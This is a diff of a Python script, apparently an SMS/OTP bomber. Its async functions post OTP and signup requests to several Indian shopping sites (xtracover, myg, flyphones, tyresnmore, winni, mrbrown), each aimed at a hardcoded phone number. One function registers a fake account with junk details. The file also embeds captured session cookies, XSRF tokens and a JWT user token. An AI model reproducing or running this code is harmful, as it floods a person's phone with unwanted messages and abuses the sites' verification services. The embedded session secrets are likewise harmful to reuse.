userUP=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY4OTQ5NTg3MCwiaWF0IjoxNjg4ODkxMDcwLCJpc3MiOiJUUyIsImp0aSI6ImEzYjBmOTMwYmFiMjQ3ODA4OTRkNzU4NjY2MGQ1ZmU2Iiwic3ViIjoie1wiaElkXCI6XCJmN2FlNmFiMTI0NDI0NjcyOTMwMjA4ZDFlOThmNWJiNVwiLFwicElkXCI6XCI2N2ZlNDljNWU3MmM0NTVjYWVlNmQ2ZGJhOTc1YWMxYlwiLFwibmFtZVwiOlwiWW91XCIsXCJpcFwiOlwiNDIuMTExLjEzLjM4XCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcIjQ2NDExMy00YWJmNGMtOTZjOTQzLTZlYmIwNVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2ODg4OTEwNzA5OTAsXCJkcGlkXCI6XCI2N2ZlNDljNWU3MmM0NTVjYWVlNmQ2ZGJhOTc1YWMxYlwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFEb0FDZ3dJQUNJSWtBSDNzNExPa3pFS0JBZ0FFZ0FLQkFnQVFnQUtCQWdBTWdBS2VRZ0FLblVLQWdvQUNnUUtBZ2dDQ21rS0J3Z0JGUUFBQUVBU0Nnb0RhMkZ1SmZyNkV6d1NDZ29EZEdWc0pTbUYzRDBTQ2dvRFpXNW5KVkNYTkQwU0Nnb0RiV0Z5SlptZk5qMFNDZ29EYUdsdUpSSUFFajhTQ2dvRFltVnVKUVZhaHowU0Nnb0RiV0ZzSlpVTUZEMFNDZ29EZEdGdEpTai8rVDA9XCJ9IiwidmVyc2lvbiI6IjFfMCJ9.vxxwB24K3IA6woi5hlvUOnRuOoKzs8OUCvAyvBppWg8; userHID=f7ae6ab124424672930208d1e98f5bb5; userPID=67fe49c5e72c455caee6d6dba975ac1b; _fbp=fb.1.1688890860738.1558577123; _ga=GA1.2.2145563385.1688890861; _gid=GA1.2.1953227971.1688890862; _gat_UA-53733575-1=1; _uetsid=8aeb46101e3111ee978e07406301b7ea; _uetvid=8aeb4af01e3111eea07b1da37cac1674; _ga_QV5FD29XJC=GS1.1.1688890860.1.1.1688890865.55.0.0; AK_SERVER_TIME=1688891088; userCountryCode=in',
-                'origin': 'https://www.hotstar.com',
-                'referer': 'https://www.hotstar.com/in/mypage',
+                'authority': 'www.xtracover.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                # 'cookie': '_gcl_au=1.1.437252216.1686488607; XcCart=rntljjxihtxmt5gmwlx55d4p; _fbp=fb.1.1686488607618.1734074002; _hjSessionUser_2540939=eyJpZCI6ImY1ZWM4MzE0LTJhYzItNTMzZi1iNzk2LTMyOGM3YzAxNzc2ZiIsImNyZWF0ZWQiOjE2ODY0ODg2MDg0NDksImV4aXN0aW5nIjp0cnVlfQ==; ASP.NET_SessionId=lypcjzops3h0ealvoro3i3zs; tcl54JDWDWFWEFDFJ2142DSAFD=pdXWe0QVjAm3G0wRTUIvz3xzd0GP/KpNktWNcczoyD9/drOB5S7JumenV4dEO52gtv6V4sTngO8Gpmh7tb1Mgy+FqNZmWZp2GHDlF+2/Y7X15LZNA8HhirzH4prX4/xfZmdP/F4O7y3d7aOkpjh5OqRFYaO74ug6hI0ycRy+7lYou9nsmG0z9blBw8qdDF1IJNTWjp0Kzv60GUEsQYenQxv8lK/3mHOmG4N+ZbFTjiTd0r7xjwYZb1ClbCoMt2gOLT1PgCl2fx9umqmtLtVW+w==; tct54JDWDWFWEFDFJ2142DSAFD=pdXWe0QVjAm3G0wRTUIvz3xzd0GP/KpNktWNcczoyD82LpfEVMpy1b0VEqjnO/p9WvY2S2HcAS7VuNYBqtNEyGx3Q9uPgxvXeaWNjAKyj65YB32413jWTyVuONFSLx9v/0Yn9mk9oxmC73TiScIRzykLbfQu2QZ9xijcH2D5mil+HAj+JgJcXTNyRMMnbyW4L2xgoE5culelKW/M39JngUWuJ6qOSz35neDQlGALMh8=; _gid=GA1.2.555995201.1688926130; _gat_gtag_UA_175427683_1=1; _clck=10x2wrd|2|fd5|0|1257; _hjIncludedInSessionSample_2540939=0; _hjSession_2540939=eyJpZCI6IjlmNzNjMTBmLWNkYWItNGRjYS04NTVkLTQ3OGU0OTczZDZkZiIsImNyZWF0ZWQiOjE2ODg5MjYxMzQ2NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga_PVWZVW9QBM=GS1.1.1688926130.2.1.1688926141.49.0.0; _ga=GA1.1.1981712338.1686488607; _ga_4RW6VRZC6Z=GS1.1.1688926130.1.1.1688926141.49.0.0; _clsk=1xy9yxu|1688926142905|2|1|y.clarity.ms/collect',
+                'origin': 'https://www.xtracover.com',
+                'referer': 'https://www.xtracover.com/CustomerLogin',
                 'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
@@ -1162,39 +1131,336 @@ def indcall():
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-                'x-country-code': 'in',
-                'x-hs-accept-language': 'eng',
-                'x-hs-client': 'platform:web;app_version:23.06.23.3;browser:Chrome;schema_version:0.0.911',
-                'x-hs-client-targeting': 'ad_id:464113-4abf4c-96c943-6ebb05;user_lat:false',
-                'x-hs-device-id': '464113-4abf4c-96c943-6ebb05',
-                'x-hs-platform': 'web',
-                'x-hs-request-id': '8e6a05-ca477-58f317-1ec7b7',
-                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY4OTQ5NTg3MCwiaWF0IjoxNjg4ODkxMDcwLCJpc3MiOiJUUyIsImp0aSI6ImEzYjBmOTMwYmFiMjQ3ODA4OTRkNzU4NjY2MGQ1ZmU2Iiwic3ViIjoie1wiaElkXCI6XCJmN2FlNmFiMTI0NDI0NjcyOTMwMjA4ZDFlOThmNWJiNVwiLFwicElkXCI6XCI2N2ZlNDljNWU3MmM0NTVjYWVlNmQ2ZGJhOTc1YWMxYlwiLFwibmFtZVwiOlwiWW91XCIsXCJpcFwiOlwiNDIuMTExLjEzLjM4XCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcIjQ2NDExMy00YWJmNGMtOTZjOTQzLTZlYmIwNVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2ODg4OTEwNzA5OTAsXCJkcGlkXCI6XCI2N2ZlNDljNWU3MmM0NTVjYWVlNmQ2ZGJhOTc1YWMxYlwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFEb0FDZ3dJQUNJSWtBSDNzNExPa3pFS0JBZ0FFZ0FLQkFnQVFnQUtCQWdBTWdBS2VRZ0FLblVLQWdvQUNnUUtBZ2dDQ21rS0J3Z0JGUUFBQUVBU0Nnb0RhMkZ1SmZyNkV6d1NDZ29EZEdWc0pTbUYzRDBTQ2dvRFpXNW5KVkNYTkQwU0Nnb0RiV0Z5SlptZk5qMFNDZ29EYUdsdUpSSUFFajhTQ2dvRFltVnVKUVZhaHowU0Nnb0RiV0ZzSlpVTUZEMFNDZ29EZEdGdEpTai8rVDA9XCJ9IiwidmVyc2lvbiI6IjFfMCJ9.vxxwB24K3IA6woi5hlvUOnRuOoKzs8OUCvAyvBppWg8',
-                'x-request-id': '8e6a05-ca477-58f317-1ec7b7',
+                'x-requested-with': 'XMLHttpRequest',
             }
 
-            params = {
-                'action': 'resendOtp',
+            data = {
+                'mobileno': '9990212082',
+                'IsCheckOutUsedSystemOtp': '0',
             }
-
-            json_data = {
-                'body': {
-                    '@type': 'type.googleapis.com/feature.login.InitiatePhoneLoginRequest',
-                    'phone_number': '9990212082',
-                    'initiate_by': 1,
-                    'recaptcha_token': '',
-                    'source': 0,
-                },
-            }
-
-            response = requests.post(
-                'https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8',
-                params=params,
-                cookies=cookies,
-                headers=headers,
-                json=json_data,
-            )
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://www.xtracover.com/MyAccount/GetOtpByMobileNo', cookies=cookies, headers=headers, data=data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
+        
+    async def mgy(tarnum: int):
+        try:
+            cookies = {
+                'sid_customer_d203b': 'db6234fd2a4f829d94d352315c9614fc-1-C',
+                '_vwo_uuid_v2': 'D443946B37BD36505CF9ABFEEE4617756|c0c9a3457cf7f11c0ac76d64749d5f6f',
+                '_gcl_au': '1.1.1542016687.1688926663',
+                '_ga': 'GA1.1.2014603452.1688926663',
+                '_fbp': 'fb.1.1688926662954.851631705',
+                '_clck': '1x6t56i|2|fd5|0|1285',
+                '_clsk': '15tadag|1688926686104|1|1|b.clarity.ms/collect',
+                '_ga_R3SNBE5CG8': 'GS1.1.1688926662.1.1.1688926713.9.0.0',
+            }
+
+            headers = {
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Connection': 'keep-alive',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                # 'Cookie': 'sid_customer_d203b=db6234fd2a4f829d94d352315c9614fc-1-C; _vwo_uuid_v2=D443946B37BD36505CF9ABFEEE4617756|c0c9a3457cf7f11c0ac76d64749d5f6f; _gcl_au=1.1.1542016687.1688926663; _ga=GA1.1.2014603452.1688926663; _fbp=fb.1.1688926662954.851631705; _clck=1x6t56i|2|fd5|0|1285; _clsk=15tadag|1688926686104|1|1|b.clarity.ms/collect; _ga_R3SNBE5CG8=GS1.1.1688926662.1.1.1688926713.9.0.0',
+                'Origin': 'https://www.myg.in',
+                'Referer': 'https://www.myg.in/',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+                'X-Requested-With': 'XMLHttpRequest',
+                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+            }
+
+            params = {
+                'dispatch': 'fk_login.register',
+            }
+
+            data = {
+                'ship_to_another': '1',
+                'user_data[firstname]': 'bhjbshjvb',
+                'user_data[lastname]': 'cmsv  v',
+                'user_data[phone]': '9990212082',
+                'user_data[email]': 'ndnvnf@gmail.com',
+                'user_data[password1]': '17074502',
+                'user_data[password2]': '17074502',
+                'security_hash': '53228cf784793b1d89cfb22875c9c530',
+                'is_ajax': '1',
+            }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://www.myg.in/index.php', params=params, cookies=cookies, headers=headers, data=data) as response:
+                    print(response.text)
+            return "done"
+        except Exception as e:
+            return "failed"
+        
+    async def flyphone(tarnum: int):
+        try:
+            cookies = {
+                'webtype': 'undefined',
+                'googtrans': '/en/en',
+                'googtrans': '/en/en',
+                'NSSESSION': 's%3A5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS.D9vpeOjw%2BSz5YpqWTB7BZadYQASgBBiG9QYGSqz8q50',
+                'PHPWEBSTORESESSION': '5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS',
+                'twk_idm_key': 'a93bTn7z3Qzoos1T_rgPs',
+                'TawkConnectionTime': '0',
+                'twk_uuid_61268648649e0a0a5cd2eea9': '%7B%22uuid%22%3A%221.SwpLLChOGslHzfjvXF5GksFDS6RycfQKwS0P7bSLHLnW6nLf1NgcYi7V4hVqcBhc66wPveCNJlrIhm966EgS3ww653IVUmCWIn1ukTOysDY2HvAvbb6IC%22%2C%22version%22%3A3%2C%22domain%22%3A%22flyphones.in%22%2C%22ts%22%3A1688927126119%7D',
+            }
+
+            headers = {
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Connection': 'keep-alive',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                # 'Cookie': 'webtype=undefined; googtrans=/en/en; googtrans=/en/en; NSSESSION=s%3A5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS.D9vpeOjw%2BSz5YpqWTB7BZadYQASgBBiG9QYGSqz8q50; PHPWEBSTORESESSION=5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS; twk_idm_key=a93bTn7z3Qzoos1T_rgPs; TawkConnectionTime=0; twk_uuid_61268648649e0a0a5cd2eea9=%7B%22uuid%22%3A%221.SwpLLChOGslHzfjvXF5GksFDS6RycfQKwS0P7bSLHLnW6nLf1NgcYi7V4hVqcBhc66wPveCNJlrIhm966EgS3ww653IVUmCWIn1ukTOysDY2HvAvbb6IC%22%2C%22version%22%3A3%2C%22domain%22%3A%22flyphones.in%22%2C%22ts%22%3A1688927126119%7D',
+                'Origin': 'https://www.flyphones.in',
+                'Referer': 'https://www.flyphones.in/',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+            }
+
+            data = {
+                'action': 'sendOtp',
+                'data': '{"supid":70237,"mobile":"9990212082","from":"signup"}',
+            }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post(
+                'https://www.flyphones.in/functions/market/ajxgrocpharmaction.php',
+                cookies=cookies,
+                headers=headers,
+                data=data,
+                ) as response:
+                    print(response.text)
+                return "done"
+        except Exception as e:
+            return "failed"
+        
+    async def tyre(tarnum: int):
+        try:
+            cookies = {
+                'form_key': 'Ke8B8fC3DlS1v2mD',
+                'mage-cache-storage': '{}',
+                'mage-cache-storage-section-invalidation': '{}',
+                'mage-cache-sessid': 'true',
+                'PHPSESSID': 'b2ddeb3f26d7fa59d8fd1e21065f24fe',
+                'form_key': 'Ke8B8fC3DlS1v2mD',
+                'mage-messages': '',
+                'recently_viewed_product': '{}',
+                'recently_viewed_product_previous': '{}',
+                'recently_compared_product': '{}',
+                'recently_compared_product_previous': '{}',
+                'product_data_storage': '{}',
+                '_gcl_au': '1.1.1382506490.1688927391',
+                '_ga_35FKSWSLD2': 'GS1.1.1688927391.1.0.1688927391.60.0.0',
+                '_uetsid': '97c9d4601e8611ee88966539e39ca4b6',
+                '_uetvid': '97ca14d01e8611ee85c75f7179a410c9',
+                '_ga': 'GA1.2.1390966305.1688927391',
+                '_gid': 'GA1.2.98156956.1688927392',
+                '_dc_gtm_UA-51959063-1': '1',
+                '_clck': '1ibzzk2|2|fd5|0|1285',
+                '_fbp': 'fb.1.1688927392382.1598686577',
+                '_clsk': '9jdc3h|1688927393245|1|1|u.clarity.ms/collect',
+                '_gat_UA-51959063-1': '1',
+                'section_data_ids': '{%22customer%22:1688927600%2C%22messages%22:null}',
+            }
+
+            headers = {
+                'authority': 'tyresnmore.com',
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                # 'cookie': 'form_key=Ke8B8fC3DlS1v2mD; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; PHPSESSID=b2ddeb3f26d7fa59d8fd1e21065f24fe; form_key=Ke8B8fC3DlS1v2mD; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _gcl_au=1.1.1382506490.1688927391; _ga_35FKSWSLD2=GS1.1.1688927391.1.0.1688927391.60.0.0; _uetsid=97c9d4601e8611ee88966539e39ca4b6; _uetvid=97ca14d01e8611ee85c75f7179a410c9; _ga=GA1.2.1390966305.1688927391; _gid=GA1.2.98156956.1688927392; _dc_gtm_UA-51959063-1=1; _clck=1ibzzk2|2|fd5|0|1285; _fbp=fb.1.1688927392382.1598686577; _clsk=9jdc3h|1688927393245|1|1|u.clarity.ms/collect; _gat_UA-51959063-1=1; section_data_ids={%22customer%22:1688927600%2C%22messages%22:null}',
+                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM3MzA3NTAiLCJhcCI6IjExMjAxNDI0NDkiLCJpZCI6ImUzMjJmMjZkNmVjOTE1NzciLCJ0ciI6IjMzOTg3M2ZiNjMxOGQxZjIzOTEzMTk0YjY2MWNkYzAwIiwidGkiOjE2ODg5Mjc0MDM5MDAsInRrIjoiMTMyMjg0MCJ9fQ==',
+                'origin': 'https://tyresnmore.com',
+                'referer': 'https://tyresnmore.com/',
+                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'traceparent': '00-339873fb6318d1f23913194b661cdc00-e322f26d6ec91577-01',
+                'tracestate': '1322840@nr=0-1-3730750-1120142449-e322f26d6ec91577----1688927403900',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+                'x-newrelic-id': 'VwEEUVFWCBABVFhaAQMDUFIG',
+                'x-requested-with': 'XMLHttpRequest',
+            }
+
+            data = {
+                'form_key': 'Ke8B8fC3DlS1v2mD',
+                'phone_number': '9990212082',
+                'login_type': 'otp',
+            }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://tyresnmore.com/otplogin/account/otploginpost/', cookies=cookies, headers=headers, data=data) as response:
+                    print(response.text)
+
+                return "done"
+        except Exception as e:
+            return "failed"  
+
+
+
+    async def winni(tarnum: int):
+        try:
+            cookies = {
+                'AKA_A2': 'A',
+                '_gcl_au': '1.1.2039960549.1688927485',
+                '_gid': 'GA1.2.937546034.1688927485',
+                '_gat_UA-38175959-1': '1',
+                '_tguatd': '{"sc":"(direct)"}',
+                '_tgpc': '655bb04b-e388-5ec3-bd8b-a8e56666814b',
+                '_tgidts': '{"sh":"d41d8cd98f00b204e9800998ecf8427e","ci":"1743c5fb-44a8-5c2e-b256-9aa5e1c16f3b","si":"9f21a045-ddc8-5178-b49c-11ce596b43ba"}',
+                'v': '357897496',
+                'ud': 'D3A659BF-927C-4B7B-BA7B-2CCF1EEA916A',
+                'puid': '284114',
+                'aqs': '4',
+                'XSRF-TOKEN': '44085e1e-b1a6-48ac-8227-976432c128ca',
+                'sessid': 'MzVlMmRlM2EtNTlhNC00ZGVjLWI1ZjUtMDJhYWZmZDA2Yjg1',
+                '_fbp': 'fb.1.1688927485666.1294176012',
+                '_tgsc': '9f21a045-ddc8-5178-b49c-11ce596b43ba:-1',
+                '_tglksd': '{"s":"9f21a045-ddc8-5178-b49c-11ce596b43ba","st":1688927484937,"sod":"(direct)","sodt":1688927484937,"sods":"c","sodst":1688927513043}',
+                '_ga_R2MDN249LR': 'GS1.1.1688927485.1.1.1688927513.32.0.0',
+                '_ga': 'GA1.1.390273447.1688927485',
+                '_uetsid': 'cf9c79301e8611eebf6f9b5685805bfe',
+                '_uetvid': 'e21a5360ef4711ed940669c6e55b096c',
+                'AWSALBTG': '6hqOd5foLrtC1UscIhfPJxUKhRRMw+A3aDOJh8dNQR/0hu+QH9XvGZYHlJmSar7enmDINeY/h+rd7QQD5iWw6hUJbupMasAefnXtAMC9qF+NS40+rctbs0QNyW+ci+UoUPcsoLRmgUUgug65PGeuQBzAlzmpMSpGXH9vM0Puod5o',
+                'AWSALBTGCORS': '6hqOd5foLrtC1UscIhfPJxUKhRRMw+A3aDOJh8dNQR/0hu+QH9XvGZYHlJmSar7enmDINeY/h+rd7QQD5iWw6hUJbupMasAefnXtAMC9qF+NS40+rctbs0QNyW+ci+UoUPcsoLRmgUUgug65PGeuQBzAlzmpMSpGXH9vM0Puod5o',
+                'AWSALB': 'RekWcV+8va1tPHhN+xKtIUFwdbvkSvGZDMZVAMYbvzO0TnUFAvtgdNPE6t39NMY8ZYUbfoLezRosloW+rZgOX9mr3uZRPdaxl8v7YrOLVCyEY8E0ad2lFhKiJRgH',
+                'AWSALBCORS': 'RekWcV+8va1tPHhN+xKtIUFwdbvkSvGZDMZVAMYbvzO0TnUFAvtgdNPE6t39NMY8ZYUbfoLezRosloW+rZgOX9mr3uZRPdaxl8v7YrOLVCyEY8E0ad2lFhKiJRgH',
+                '_tgsid': '{"lpd":"{\\"lpu\\":\\"https://www.winni.in%2F\\",\\"lpt\\":\\"%231%20online%20Cake%2C%20Flowers%20and%20Gifts%20Delivery%20in%20India%20%7C%20Winni\\"}","ps":"d628e8d2-a0d7-45fb-a886-46133d205d37","ec":"4","pv":"1"}',
+                'RT': '"z=1&dm=www.winni.in&si=b324df05-c8c2-4d69-9dee-82bfd848f2f6&ss=ljvrtemr&sl=1&tt=1qk&rl=1&nu=3nqtq01e&cl=qxd"',
+                'kndctr_C757499F6284EAAF0A495C50_AdobeOrg_cluster': 'ind1',
+                'kndctr_C757499F6284EAAF0A495C50_AdobeOrg_identity': 'CiY0MzMwODU1NjEwNjkyMTA5Nzk2MTM4NDg1NzIxMzkwMjkzMDM2OVIPCJjxv9-TMRgBKgRJTkQxoAGc8b_fkzHwAZjxv9-TMQ==',
+                'AMCV_C757499F6284EAAF0A495C50%40AdobeOrg': 'MCMID|43308556106921097961384857213902930369',
+                '_tgtim': '9f21a045-ddc8-5178-b49c-11ce596b43ba:1688927488862:-1',
+            }
+
+            headers = {
+                'authority': 'www.winni.in',
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                # 'cookie': 'AKA_A2=A; _gcl_au=1.1.2039960549.1688927485; _gid=GA1.2.937546034.1688927485; _gat_UA-38175959-1=1; _tguatd={"sc":"(direct)"}; _tgpc=655bb04b-e388-5ec3-bd8b-a8e56666814b; _tgidts={"sh":"d41d8cd98f00b204e9800998ecf8427e","ci":"1743c5fb-44a8-5c2e-b256-9aa5e1c16f3b","si":"9f21a045-ddc8-5178-b49c-11ce596b43ba"}; v=357897496; ud=D3A659BF-927C-4B7B-BA7B-2CCF1EEA916A; puid=284114; aqs=4; XSRF-TOKEN=44085e1e-b1a6-48ac-8227-976432c128ca; sessid=MzVlMmRlM2EtNTlhNC00ZGVjLWI1ZjUtMDJhYWZmZDA2Yjg1; _fbp=fb.1.1688927485666.1294176012; _tgsc=9f21a045-ddc8-5178-b49c-11ce596b43ba:-1; _tglksd={"s":"9f21a045-ddc8-5178-b49c-11ce596b43ba","st":1688927484937,"sod":"(direct)","sodt":1688927484937,"sods":"c","sodst":1688927513043}; _ga_R2MDN249LR=GS1.1.1688927485.1.1.1688927513.32.0.0; _ga=GA1.1.390273447.1688927485; _uetsid=cf9c79301e8611eebf6f9b5685805bfe; _uetvid=e21a5360ef4711ed940669c6e55b096c; AWSALBTG=6hqOd5foLrtC1UscIhfPJxUKhRRMw+A3aDOJh8dNQR/0hu+QH9XvGZYHlJmSar7enmDINeY/h+rd7QQD5iWw6hUJbupMasAefnXtAMC9qF+NS40+rctbs0QNyW+ci+UoUPcsoLRmgUUgug65PGeuQBzAlzmpMSpGXH9vM0Puod5o; AWSALBTGCORS=6hqOd5foLrtC1UscIhfPJxUKhRRMw+A3aDOJh8dNQR/0hu+QH9XvGZYHlJmSar7enmDINeY/h+rd7QQD5iWw6hUJbupMasAefnXtAMC9qF+NS40+rctbs0QNyW+ci+UoUPcsoLRmgUUgug65PGeuQBzAlzmpMSpGXH9vM0Puod5o; AWSALB=RekWcV+8va1tPHhN+xKtIUFwdbvkSvGZDMZVAMYbvzO0TnUFAvtgdNPE6t39NMY8ZYUbfoLezRosloW+rZgOX9mr3uZRPdaxl8v7YrOLVCyEY8E0ad2lFhKiJRgH; AWSALBCORS=RekWcV+8va1tPHhN+xKtIUFwdbvkSvGZDMZVAMYbvzO0TnUFAvtgdNPE6t39NMY8ZYUbfoLezRosloW+rZgOX9mr3uZRPdaxl8v7YrOLVCyEY8E0ad2lFhKiJRgH; _tgsid={"lpd":"{\\"lpu\\":\\"https://www.winni.in%2F\\",\\"lpt\\":\\"%231%20online%20Cake%2C%20Flowers%20and%20Gifts%20Delivery%20in%20India%20%7C%20Winni\\"}","ps":"d628e8d2-a0d7-45fb-a886-46133d205d37","ec":"4","pv":"1"}; RT="z=1&dm=www.winni.in&si=b324df05-c8c2-4d69-9dee-82bfd848f2f6&ss=ljvrtemr&sl=1&tt=1qk&rl=1&nu=3nqtq01e&cl=qxd"; kndctr_C757499F6284EAAF0A495C50_AdobeOrg_cluster=ind1; kndctr_C757499F6284EAAF0A495C50_AdobeOrg_identity=CiY0MzMwODU1NjEwNjkyMTA5Nzk2MTM4NDg1NzIxMzkwMjkzMDM2OVIPCJjxv9-TMRgBKgRJTkQxoAGc8b_fkzHwAZjxv9-TMQ==; AMCV_C757499F6284EAAF0A495C50%40AdobeOrg=MCMID|43308556106921097961384857213902930369; _tgtim=9f21a045-ddc8-5178-b49c-11ce596b43ba:1688927488862:-1',
+                'origin': 'https://www.winni.in',
+                'referer': 'https://www.winni.in/customer/login',
+                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+                'x-requested-with': 'XMLHttpRequest',
+                'x-xsrf-token': '44085e1e-b1a6-48ac-8227-976432c128ca',
+            }
+
+            data = {
+                'email': '',
+                'mobile': '9990212082',
+                'countryCode': '+91',
+                'scrval': '',
+                'isvlexst': 'nguTGPa4QPlAKM32kkam1AlamJs39qNpATqNb2s',
+            }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://www.winni.in/customer/verify-email', cookies=cookies, headers=headers, data=data) as response:
+                    print(response.text)
+            return "done"
+        except Exception as e:
+            return "failed"
+    
+    async def mrbrown(tarnum: int):
+        try:
+            cookies = {
+                '_gcl_au': '1.1.1957854088.1688927598',
+                '_gid': 'GA1.2.1582251896.1688927599',
+                '_gat_UA-78924810-1': '1',
+                '_clck': '8sn6gz|2|fd5|0|1285',
+                '_fbp': 'fb.1.1688927600216.1704611332',
+                'delpin': '110001',
+                'XSRF-TOKEN': 'eyJpdiI6IjZRbzJ0V2s3VEJEUHJTUlZJZGVLMmc9PSIsInZhbHVlIjoiN0p2UDd1N3JBMTVrWkdYdmMyNVZaMDlPV2xqQUtYN2NjRGFrVWJkaTVadUQrWHJCSlpvaUptM3RLTnQzQ0g2byIsIm1hYyI6IjI5ZDhjMzg2MjJmOTc1OTI3NmJmZmRiNzBjOThhODc0YzEwNGQ3MWI4Mjg4NDVkOGUwZjMxMjUzNWJlMzM2YmQifQ%3D%3D',
+                'brown_session': 'eyJpdiI6ImduXC9nMjYyWFBIXC9aVmp0K3JuZDErUT09IiwidmFsdWUiOiJCV09OTEcweXhUXC9CQWlrVHJwZENsb0lnZjFzYjdlcnNhZ1ZRdmxZWmdmU3NCNEJVWFpuRytJMUJJYnNqTjYrQyIsIm1hYyI6IjZmZjRjZTk0YWRmNWI0OTJjZGM3ZDE4YzA4MWIwNzc1YWRlNjgzMjkyMmFiNDVmYWMyMjA3MDUwMjA4MTNiZDYifQ%3D%3D',
+                '_ga_VQHFT3DPHH': 'GS1.1.1688927598.1.1.1688927601.57.0.0',
+                '_ga': 'GA1.2.778904199.1688927599',
+                '_ga_JN38K0S1LX': 'GS1.2.1688927599.1.1.1688927602.57.0.0',
+                '_clsk': '1nw0vh8|1688927602671|2|1|t.clarity.ms/collect',
+            }
+
+            headers = {
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Accept-Language': 'en-US,en;q=0.9',
